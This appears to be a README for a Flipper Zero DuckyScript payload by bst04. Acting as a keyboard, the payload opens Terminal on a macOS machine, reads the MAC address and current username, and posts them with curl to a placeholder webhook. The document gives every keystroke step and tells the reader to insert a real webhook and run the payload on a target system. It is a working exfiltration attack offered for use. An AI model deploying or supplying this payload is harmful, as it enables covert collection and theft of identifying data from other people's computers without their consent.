# GetMacAddress-FlipZero by bst04

## Description

This payload, created by bst04, is designed to retrieve the MAC address and username from a macOS system and send this information to a specified webhook.

---

## Technical Explanation

1. **Initialization**:
    - `DELAY 1000`: Waits for 1 second to ensure the system is ready.
    - `GUI SPACE`: Simulates pressing "Command" + "Space" to open Spotlight Search.
    - `DELAY 250`: Waits for 0.25 seconds to ensure Spotlight is open.
    - `STRING TERMINAL`: Types "TERMINAL" to search for the Terminal application.
    - `DELAY 250`: Waits for 0.25 seconds.
    - `ENTER`: Opens the Terminal application.

2. **Retrieve MAC Address**:
    - `DELAY 750`: Waits for 0.75 seconds to ensure Terminal is fully opened.
    - `STRING mac=$(networksetup -getmacaddress en0)`: Retrieves the MAC address of the primary network interface.
    - `DELAY 750`: Waits for 0.75 seconds.
    - `ENTER`: Executes the command to get the MAC address.

3. **Retrieve Username**:
    - `DELAY 750`: Waits for 0.75 seconds.
    - `STRING name=$(id -un)`: Retrieves the current user's username.
    - `DELAY 750`: Waits for 0.75 seconds.
    - `ENTER`: Executes the command to get the username.

4. **Send Data to Webhook**:
    - `DELAY 850`: Waits for 0.85 seconds.
    - `STRING curl -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "content=User:$name | $mac" https://webhook`: Sends the MAC address and username to the specified webhook.
    - `DELAY 800`: Waits for 0.8 seconds.
    - `ENTER`: Executes the command to send data to the webhook.

---

## Usage

1. Copy the payload script to your DuckyScript-enabled device.
2. Ensure the device is connected to a macOS system.
3. Replace `https://webhook` with your actual webhook URL.
4. Execute the payload to retrieve the MAC address and username, then send the data to the specified webhook.


